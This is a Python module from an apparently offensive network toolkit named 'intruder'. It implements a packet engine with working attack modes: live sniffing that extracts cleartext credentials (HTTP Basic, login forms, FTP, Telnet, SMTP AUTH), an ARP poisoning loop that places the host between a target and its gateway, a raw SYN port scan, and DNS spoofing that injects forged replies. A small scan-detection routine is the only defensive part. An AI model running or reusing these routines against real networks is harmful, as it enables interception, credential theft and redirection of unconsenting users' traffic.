"""
engines/intruder/packet_engine.py

PacketEngine — Hybrid live capture + packet injection engine.
  • pyshark  → live interface sniffing, protocol dissection, cred sniffing
  • scapy    → packet crafting & injection (ARP spoof, TCP SYN, DNS spoof)

Follows StalkEngine / NmapEngine StreamEvent contract exactly.

StreamEvent kinds : "progress" | "result" | "error" | "complete"
Severity levels   : "INFO" | "WARN" | "ALERT" | "CRITICAL"

Requires (Windows): Npcap installed  https://npcap.com
Requires (Linux)  : CAP_NET_RAW or run as root
"""

from __future__ import annotations

import asyncio
import re
import threading
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any, AsyncGenerator, Callable, Dict, List, Optional

from registry.event_bus import bus

try:
    from core.base import StreamEvent
except ImportError:
    from dataclasses import dataclass as _dc, field as _f
    import time as _t

    @_dc
    class StreamEvent:
        engine_id: str
        kind: str
        data: Any = None
        severity: str = "INFO"
        ts: float = _f(default_factory=_t.time)
        def to_dict(self) -> dict: return self.__dict__


# ── Constants ────────────────────────────────────────────────────────
TOOL_ID   = "packet"
CATEGORY  = "intruder"
ENGINE_ID = f"{CATEGORY}.{TOOL_ID}"

# Cleartext credential patterns  (protocol → regex)
_CRED_PATTERNS: Dict[str, re.Pattern] = {
    "HTTP_Basic": re.compile(
        rb"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.IGNORECASE
    ),
    "HTTP_Form":  re.compile(
        rb"(?:user(?:name)?|login|email|pass(?:word)?|pwd)=([^&\s]{3,64})",
        re.IGNORECASE
    ),
    "FTP_USER":   re.compile(rb"USER\s+(\S+)", re.IGNORECASE),
    "FTP_PASS":   re.compile(rb"PASS\s+(\S+)", re.IGNORECASE),
    "Telnet":     re.compile(rb"(?:login|password):\s*(\S+)", re.IGNORECASE),
    "SMTP_AUTH":  re.compile(rb"AUTH\s+(?:LOGIN|PLAIN)\s+([A-Za-z0-9+/=]+)",
                             re.IGNORECASE),
}

# Port → protocol name
_PORT_PROTO: Dict[int, str] = {
    21: "FTP", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
    445: "SMB", 3306: "MySQL", 5432: "Postgres",
}

# Suspicious scan heuristics
_SCAN_THRESHOLD_PPS = 30   # packets/sec from one IP → port scan alert
_SYN_THRESHOLD      = 20   # SYN-only packets in window → SYN scan alert


# ── Data containers ──────────────────────────────────────────────────
@dataclass
class ProtoStats:
    """Rolling protocol counters."""
    counts: Dict[str, int]     = field(default_factory=lambda: defaultdict(int))
    bytes_:  Dict[str, int]    = field(default_factory=lambda: defaultdict(int))
    t_start: float             = field(default_factory=time.time)

    def record(self, proto: str, size: int = 0):
        self.counts[proto] += 1
        self.bytes_[proto] += size

    def summary(self) -> Dict[str, Any]:
        elapsed = max(time.time() - self.t_start, 1)
        return {
            proto: {
                "packets": cnt,
                "bytes":   self.bytes_[proto],
                "pps":     round(cnt / elapsed, 2),
            }
            for proto, cnt in self.counts.items()
        }


@dataclass
class ScanTracker:
    """Tracks per-src-IP packet rates for scan detection."""
    window:  Dict[str, List[float]] = field(
        default_factory=lambda: defaultdict(list)
    )
    syn_map: Dict[str, int]         = field(
        default_factory=lambda: defaultdict(int)
    )

    def record(self, src_ip: str, is_syn: bool = False) -> Optional[str]:
        now = time.time()
        bucket = self.window[src_ip]
        # keep only last 5 seconds
        self.window[src_ip] = [t for t in bucket if now - t < 5]
        self.window[src_ip].append(now)
        if is_syn:
            self.syn_map[src_ip] += 1

        pps = len(self.window[src_ip]) / 5
        if pps >= _SCAN_THRESHOLD_PPS:
            return f"PORT_SCAN"
        if self.syn_map[src_ip] >= _SYN_THRESHOLD:
            return f"SYN_SCAN"
        return None


# ── Pyshark helpers ──────────────────────────────────────────────────
def _get_interfaces() -> List[str]:
    """List available capture interfaces via pyshark."""
    try:
        import pyshark
        return pyshark.LiveCapture().interfaces  # type: ignore
    except Exception:
        return []


def _dissect_pyshark_packet(pkt) -> Optional[Dict[str, Any]]:
    """
    Extract structured fields from a pyshark packet.
    Returns None for packets we don't care about.
    """
    try:
        info: Dict[str, Any] = {
            "ts":    float(pkt.sniff_timestamp),
            "proto": pkt.highest_layer,
            "len":   int(pkt.length),
            "src":   "",
            "dst":   "",
            "sport": 0,
            "dport": 0,
            "raw":   b"",
            "flags": "",
            "info":  "",
        }

        # IP layer
        if hasattr(pkt, "ip"):
            info["src"] = pkt.ip.src
            info["dst"] = pkt.ip.dst

        # TCP layer
        if hasattr(pkt, "tcp"):
            info["sport"] = int(pkt.tcp.srcport)
            info["dport"] = int(pkt.tcp.dstport)
            info["flags"] = pkt.tcp.flags if hasattr(pkt.tcp, "flags") else ""

        # UDP layer
        elif hasattr(pkt, "udp"):
            info["sport"] = int(pkt.udp.srcport)
            info["dport"] = int(pkt.udp.dstport)

        # DNS
        if hasattr(pkt, "dns") and hasattr(pkt.dns, "qry_name"):
            info["info"] = f"DNS {pkt.dns.qry_name}"

        # HTTP
        if hasattr(pkt, "http"):
            host = getattr(pkt.http, "host", "")
            uri  = getattr(pkt.http, "request_uri", "")
            info["info"] = f"HTTP {host}{uri}".strip()
            # Grab raw payload for cred sniffing
            try:
                info["raw"] = bytes.fromhex(
                    pkt.tcp.payload.replace(":", "")
                ) if hasattr(pkt, "tcp") and hasattr(pkt.tcp, "payload") else b""
            except Exception:
                pass

        # FTP / Telnet raw payload
        if hasattr(pkt, "tcp") and hasattr(pkt.tcp, "payload"):
            if info["dport"] in (21, 23, 25, 110, 143):
                try:
                    info["raw"] = bytes.fromhex(pkt.tcp.payload.replace(":", ""))
                except Exception:
                    pass

        return info
    except Exception:
        return None


def _sniff_creds(raw: bytes, dport: int) -> List[Dict[str, str]]:
    """Scan raw payload bytes for cleartext credentials."""
    found = []
    for label, pattern in _CRED_PATTERNS.items():
        for match in pattern.finditer(raw):
            found.append({
                "type":  label,
                "value": match.group(1).decode(errors="replace")[:80],
                "port":  str(dport),
            })
    return found


# ── Scapy injection helpers ──────────────────────────────────────────
def _scapy_arp_spoof(target_ip: str, gateway_ip: str, iface: str,
                     count: int, interval: float,
                     stop_event: threading.Event,
                     on_event: Callable) -> None:
    """
    ARP poisoning loop — runs in a background thread.
    Sends gratuitous ARP replies to place us between target and gateway.
    """
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr
        our_mac = get_if_hwaddr(iface)

        arp_to_target  = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                         ARP(op=2, pdst=target_ip,  psrc=gateway_ip, hwsrc=our_mac)
        arp_to_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                         ARP(op=2, pdst=gateway_ip, psrc=target_ip,  hwsrc=our_mac)

        sent = 0
        while not stop_event.is_set() and (count == 0 or sent < count):
            sendp(arp_to_target,  iface=iface, verbose=False)
            sendp(arp_to_gateway, iface=iface, verbose=False)
            sent += 1
            on_event({
                "msg":    f"[PKT] ARP spoof #{sent} → {target_ip} ↔ {gateway_ip}",
                "kind":   "result",
                "severity": "ALERT",
                "data":   {"target": target_ip, "gateway": gateway_ip, "sent": sent},
            })
            time.sleep(interval)
    except Exception as exc:
        on_event({
            "msg":    f"[PKT] ARP spoof error: {exc}",
            "kind":   "error",
            "severity": "CRITICAL",
            "data":   {"error": str(exc)},
        })


def _scapy_syn_scan(target_ip: str, ports: List[int], iface: str,
                    on_event: Callable) -> None:
    """
    Raw SYN scan via scapy — runs in a background thread.
    No full TCP handshake → stealthier than connect scan.
    """
    try:
        from scapy.all import IP, TCP, sr1, conf
        conf.verb = 0

        for port in ports:
            pkt  = IP(dst=target_ip) / TCP(dport=port, flags="S")
            resp = sr1(pkt, timeout=1, iface=iface)
            if resp and resp.haslayer(TCP):
                tcp_flags = resp.getlayer(TCP).flags
                state = "open"   if tcp_flags == 0x12 else \
                        "closed" if tcp_flags == 0x14 else "filtered"
                on_event({
                    "msg":      f"[PKT] SYN {target_ip}:{port} → {state}",
                    "kind":     "result",
                    "severity": "ALERT" if state == "open" else "INFO",
                    "data":     {"ip": target_ip, "port": port, "state": state},
                })
    except Exception as exc:
        on_event({
            "msg":    f"[PKT] SYN scan error: {exc}",
            "kind":   "error",
            "severity": "CRITICAL",
            "data":   {"error": str(exc)},
        })


def _scapy_dns_spoof(iface: str, spoof_map: Dict[str, str],
                     stop_event: threading.Event,
                     on_event: Callable) -> None:
    """
    DNS spoofing via scapy — intercepts DNS queries and injects fake replies.
    spoof_map: {"victim.com": "1.2.3.4", ...}
    """
    try:
        from scapy.all import sniff, IP, UDP, DNS, DNSRR, DNSQR, send

        def _handle(pkt):
            if stop_event.is_set():
                return
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                qname = pkt[DNSQR].qname.decode(errors="replace").rstrip(".")
                if qname in spoof_map:
                    fake_ip = spoof_map[qname]
                    spoofed = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                        UDP(dport=pkt[UDP].sport, sport=53) /
                        DNS(
                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=fake_ip)
                        )
                    )
                    send(spoofed, verbose=False, iface=iface)
                    on_event({
                        "msg":    f"[PKT] DNS spoof: {qname} → {fake_ip}",
                        "kind":   "result",
                        "severity": "CRITICAL",
                        "data":   {"query": qname, "spoofed_to": fake_ip},
                    })

        sniff(iface=iface, filter="udp port 53",
              prn=_handle, stop_filter=lambda _: stop_event.is_set())
    except Exception as exc:
        on_event({
            "msg":    f"[PKT] DNS spoof error: {exc}",
            "kind":   "error",
            "severity": "CRITICAL",
            "data":   {"error": str(exc)},
        })


# ── Main async engine ────────────────────────────────────────────────
async def stream(
    iface:           str,
    mode:            str            = "sniff",
    packet_count:    int            = 500,
    bpf_filter:      str            = "",
    summary_interval: int           = 50,
    # ARP spoof params
    arp_target:      Optional[str]  = None,
    arp_gateway:     Optional[str]  = None,
    arp_count:       int            = 0,
    arp_interval:    float          = 2.0,
    # SYN scan params
    syn_target:      Optional[str]  = None,
    syn_ports:       Optional[List[int]] = None,
    # DNS spoof params
    dns_spoof_map:   Optional[Dict[str, str]] = None,
) -> AsyncGenerator[StreamEvent, None]:
    """
    PacketEngine main stream.

    Modes:
        "sniff"     — Live capture + dissection + cred sniffing + scan detection
        "arp_spoof" — ARP poisoning between target and gateway
        "syn_scan"  — Raw SYN scan via scapy
        "dns_spoof" — DNS query interception + fake reply injection

    Args:
        iface:            Network interface name (e.g. "eth0", "Wi-Fi")
        mode:             Operation mode (see above)
        packet_count:     Max packets to capture in sniff mode (0 = infinite)
        bpf_filter:       BPF filter string for pyshark (e.g. "tcp port 80")
        summary_interval: Emit protocol summary every N packets
        arp_target:       Target IP for ARP spoof
        arp_gateway:      Gateway IP for ARP spoof
        arp_count:        Number of ARP packets (0 = infinite until stopped)
        arp_interval:     Seconds between ARP packets
        syn_target:       Target IP for SYN scan
        syn_ports:        Port list for SYN scan
        dns_spoof_map:    Dict of {hostname: fake_ip} for DNS spoof
    """
    t_start   = time.time()
    stats     = ProtoStats()
    tracker   = ScanTracker()
    pkt_count = 0

    # Thread-safe queue for injection thread → async stream bridge
    q: asyncio.Queue = asyncio.Queue()
    loop = asyncio.get_event_loop()
    stop_event = threading.Event()

    def _thread_cb(event_dict: Dict) -> None:
        loop.call_soon_threadsafe(q.put_nowait, event_dict)

    # ── Start ─────────────────────────────────────────────────────
    yield StreamEvent(
        engine_id=ENGINE_ID,
        kind="progress",
        data={"msg": f"[PKT] PacketEngine starting → mode={mode.upper()}  iface={iface}"},
        severity="INFO",
    )
    bus.emit(f"{ENGINE_ID}.start", {"mode": mode, "iface": iface}, source=ENGINE_ID)

    # ══════════════════════════════════════════════════════════════
    # MODE: ARP SPOOF
    # ══════════════════════════════════════════════════════════════
    if mode == "arp_spoof":
        if not arp_target or not arp_gateway:
            yield StreamEvent(
                engine_id=ENGINE_ID, kind="error",
                data={"msg": "[PKT] arp_target and arp_gateway required for arp_spoof"},
                severity="CRITICAL",
            )
            return

        yield StreamEvent(
            engine_id=ENGINE_ID, kind="progress",
            data={"msg": f"[PKT] ARP poison → target={arp_target}  gw={arp_gateway}  iface={iface}"},
            severity="ALERT",
        )

        t = threading.Thread(
            target=_scapy_arp_spoof,
            args=(arp_target, arp_gateway, iface,
                  arp_count, arp_interval, stop_event, _thread_cb),
            daemon=True,
        )
        t.start()

        # Drain queue until thread finishes
        while t.is_alive() or not q.empty():
            try:
                ev = await asyncio.wait_for(q.get(), timeout=0.5)
                yield StreamEvent(
                    engine_id=ENGINE_ID,
                    kind=ev.get("kind", "result"),
                    data=ev,
                    severity=ev.get("severity", "ALERT"),
                )
                bus.emit(f"{ENGINE_ID}.arp_spoof", ev, source=ENGINE_ID)
            except asyncio.TimeoutError:
                continue

        yield StreamEvent(
            engine_id=ENGINE_ID, kind="complete",
            data={"msg": "[PKT] ARP spoof session ended.", "mode": "arp_spoof"},
            severity="INFO",
        )
        return

    # ══════════════════════════════════════════════════════════════
    # MODE: SYN SCAN
    # ══════════════════════════════════════════════════════════════
    if mode == "syn_scan":
        if not syn_target:
            yield StreamEvent(
                engine_id=ENGINE_ID, kind="error",
                data={"msg": "[PKT] syn_target required for syn_scan"},
                severity="CRITICAL",
            )
            return

        ports = syn_ports or list(range(1, 1025))
        yield StreamEvent(
            engine_id=ENGINE_ID, kind="progress",
            data={"msg": f"[PKT] SYN scan → {syn_target}  ports={len(ports)}  iface={iface}"},
            severity="WARN",
        )

        t = threading.Thread(
            target=_scapy_syn_scan,
            args=(syn_target, ports, iface, _thread_cb),
            daemon=True,
        )
        t.start()

        while t.is_alive() or not q.empty():
            try:
                ev = await asyncio.wait_for(q.get(), timeout=0.5)
                yield StreamEvent(
                    engine_id=ENGINE_ID,
                    kind=ev.get("kind", "result"),
                    data=ev,
                    severity=ev.get("severity", "INFO"),
                )
                bus.emit(f"{ENGINE_ID}.syn_scan", ev, source=ENGINE_ID)
            except asyncio.TimeoutError:
                continue

        yield StreamEvent(
            engine_id=ENGINE_ID, kind="complete",
            data={"msg": f"[PKT] SYN scan complete → {syn_target}", "mode": "syn_scan"},
            severity="INFO",
        )
        return

    # ══════════════════════════════════════════════════════════════
    # MODE: DNS SPOOF
    # ══════════════════════════════════════════════════════════════
    if mode == "dns_spoof":
        if not dns_spoof_map:
            yield StreamEvent(
                engine_id=ENGINE_ID, kind="error",
                data={"msg": "[PKT] dns_spoof_map required for dns_spoof"},
                severity="CRITICAL",
            )
            return

        yield StreamEvent(
            engine_id=ENGINE_ID, kind="progress",
            data={
                "msg": f"[PKT] DNS spoof active → watching {list(dns_spoof_map.keys())}",
                "map": dns_spoof_map,
            },
            severity="CRITICAL",
        )

        t = threading.Thread(
            target=_scapy_dns_spoof,
            args=(iface, dns_spoof_map, stop_event, _thread_cb),
            daemon=True,
        )
        t.start()

        while t.is_alive() or not q.empty():
            try:
                ev = await asyncio.wait_for(q.get(), timeout=0.5)
                yield StreamEvent(
                    engine_id=ENGINE_ID,
                    kind=ev.get("kind", "result"),
                    data=ev,
                    severity=ev.get("severity", "CRITICAL"),
                )
                bus.emit(f"{ENGINE_ID}.dns_spoof", ev, source=ENGINE_ID)
            except asyncio.TimeoutError:
                continue

        yield StreamEvent(
            engine_id=ENGINE_ID, kind="complete",
            data={"msg": "[PKT] DNS spoof session ended.", "mode": "dns_spoof"},
            severity="INFO",
        )
        return

    # ══════════════════════════════════════════════════════════════
    # MODE: SNIFF (default) — pyshark live capture
    # ══════════════════════════════════════════════════════════════
    try:
        import pyshark
    except ImportError:
        yield StreamEvent(
            engine_id=ENGINE_ID, kind="error",
            data={"msg": "[PKT] pyshark not installed — pip install pyshark"},
            severity="CRITICAL",
        )
        return

    yield StreamEvent(
        engine_id=ENGINE_ID, kind="progress",
        data={
            "msg": (
                f"[PKT] Live capture → iface={iface}  "
                f"filter='{bpf_filter or 'none'}'  "
                f"max={packet_count or '∞'} packets"
            )
        },
        severity="INFO",
    )

    # pyshark capture runs in executor (it's blocking internally)
    cap_kwargs: Dict[str, Any] = {"interface": iface, "include_raw": True}
    if bpf_filter:
        cap_kwargs["bpf_filter"] = bpf_filter

    try:
        capture = pyshark.LiveCapture(**cap_kwargs)
    except Exception as exc:
        yield StreamEvent(
            engine_id=ENGINE_ID, kind="error",
            data={"msg": f"[PKT] Failed to open capture: {exc}"},
            severity="CRITICAL",
        )
        return

    # Async packet iterator wrapper
    async def _packet_iter():
        """Wrap pyshark's blocking sniff_continuously in a thread."""
        pkt_queue: asyncio.Queue = asyncio.Queue()

        def _producer():
            try:
                for pkt in capture.sniff_continuously(
                    packet_count=packet_count or 0
                ):
                    loop.call_soon_threadsafe(pkt_queue.put_nowait, pkt)
            except Exception:
                pass
            finally:
                loop.call_soon_threadsafe(pkt_queue.put_nowait, None)  # sentinel

        threading.Thread(target=_producer, daemon=True).start()

        while True:
            pkt = await pkt_queue.get()
            if pkt is None:
                break
            yield pkt

    async for raw_pkt in _packet_iter():
        info = _dissect_pyshark_packet(raw_pkt)
        if not info:
            continue

        pkt_count += 1
        proto = info["proto"]
        stats.record(proto, info["len"])

        # ── Per-packet result event ───────────────────────────
        yield StreamEvent(
            engine_id=ENGINE_ID,
            kind="result",
            data={
                "msg":   (
                    f"[PKT] #{pkt_count:<5} {proto:<8} "
                    f"{info['src']}:{info['sport']} → "
                    f"{info['dst']}:{info['dport']}  "
                    f"{info['info'] or ''}"
                ).rstrip(),
                "proto":  proto,
                "src":    info["src"],
                "dst":    info["dst"],
                "sport":  info["sport"],
                "dport":  info["dport"],
                "len":    info["len"],
                "info":   info["info"],
                "pkt_n":  pkt_count,
            },
            severity="INFO",
        )

        # ── Credential sniffing ───────────────────────────────
        if info["raw"]:
            for cred in _sniff_creds(info["raw"], info["dport"]):
                msg = (
                    f"[PKT] ⚠ CRED {cred['type']} "
                    f"from {info['src']} "
                    f"→ {info['dst']}:{cred['port']}  "
                    f"value={cred['value']}"
                )
                yield StreamEvent(
                    engine_id=ENGINE_ID,
                    kind="result",
                    data={**cred, "src": info["src"], "dst": info["dst"], "msg": msg},
                    severity="CRITICAL",
                )
                bus.emit(f"{ENGINE_ID}.credential", cred, source=ENGINE_ID)

        # ── Scan detection ────────────────────────────────────
        if info["src"]:
            is_syn = "S" in info.get("flags", "") and "A" not in info.get("flags", "")
            alert  = tracker.record(info["src"], is_syn)
            if alert:
                yield StreamEvent(
                    engine_id=ENGINE_ID,
                    kind="result",
                    data={
                        "msg":    f"[PKT] 🚨 {alert} detected from {info['src']}",
                        "alert":  alert,
                        "src_ip": info["src"],
                    },
                    severity="ALERT",
                )
                bus.emit(f"{ENGINE_ID}.scan_alert",
                         {"type": alert, "src": info["src"]}, source=ENGINE_ID)

        # ── Protocol summary (every N packets) ───────────────
        if pkt_count % summary_interval == 0:
            summary = stats.summary()
            elapsed = round(time.time() - t_start, 1)
            top = sorted(summary.items(), key=lambda x: x[1]["packets"], reverse=True)
            lines = "  ".join(
                f"{p}={v['packets']}pkts/{v['pps']}pps" for p, v in top[:6]
            )
            yield StreamEvent(
                engine_id=ENGINE_ID,
                kind="progress",
                data={
                    "msg":     f"[PKT] [{elapsed}s] Stats: {lines}",
                    "summary": summary,
                    "elapsed": elapsed,
                    "total":   pkt_count,
                },
                severity="INFO",
            )
            bus.emit(f"{ENGINE_ID}.stats", summary, source=ENGINE_ID)

    # ── Final summary ─────────────────────────────────────────
    elapsed    = round(time.time() - t_start, 2)
    final_sum  = stats.summary()

    yield StreamEvent(
        engine_id=ENGINE_ID,
        kind="complete",
        data={
            "msg":      f"[PKT] Capture done. {pkt_count} packets in {elapsed}s",
            "total":    pkt_count,
            "elapsed":  elapsed,
            "summary":  final_sum,
            "mode":     "sniff",
        },
        severity="INFO",
    )
    bus.emit(
        f"{ENGINE_ID}.complete",
        {"total": pkt_count, "elapsed": elapsed, "summary": final_sum},
        source=ENGINE_ID,
    )


# ── Compatibility Wrapper ───────────────────────────────────────────
try:
    from engines.base import BaseEngine, Request, Response, HealthStatus
except ImportError:
    # Minimal fallback for BaseEngine
    class BaseEngine:
        def __init__(self, bus=None): self.bus = bus
    class Request: pass
    class Response: pass
    class HealthStatus: pass

class PacketEngine(BaseEngine):
    """
    Class-based wrapper to satisfy existing Registry/UI imports.
    Calls the top-level 'stream' function internally.
    """
    TOOL_ID  = TOOL_ID
    CATEGORY = CATEGORY
    VERSION  = "1.0.0"

    async def initialize(self) -> None:
        self._ready = True

    async def stream(self, req: Request) -> AsyncGenerator[StreamEvent, None]:
        iface = req.params.get("iface", "")
        mode  = req.params.get("mode", "sniff")
        count = req.params.get("packet_count", 500)
        bpf   = req.params.get("bpf_filter", "")
        
        # Mapping UI params to stream function args
        async for event in stream(
            iface=iface,
            mode=mode,
            packet_count=count,
            bpf_filter=bpf,
            arp_target=req.params.get("arp_target"),
            arp_gateway=req.params.get("arp_gateway"),
            syn_target=req.params.get("syn_target"),
            syn_ports=req.params.get("syn_ports"),
            dns_spoof_map=req.params.get("dns_spoof_map")
        ):
            yield event

    async def execute(self, req: Request) -> Response:
        # Simple collect-all implementation for sync execution
        results = []
        async for event in self.stream(req):
            if event.kind == "result":
                results.append(event.data)
        
        return Response(
            request_id=req.id,
            success=True,
            data={"results": results},
            elapsed_ms=0
        )

    def health_check(self) -> HealthStatus:
        try:
            import pyshark
            import scapy
            return HealthStatus(engine_id=self.TOOL_ID, status="OK")
        except:
            return HealthStatus(engine_id=self.TOOL_ID, status="DEGRADED")

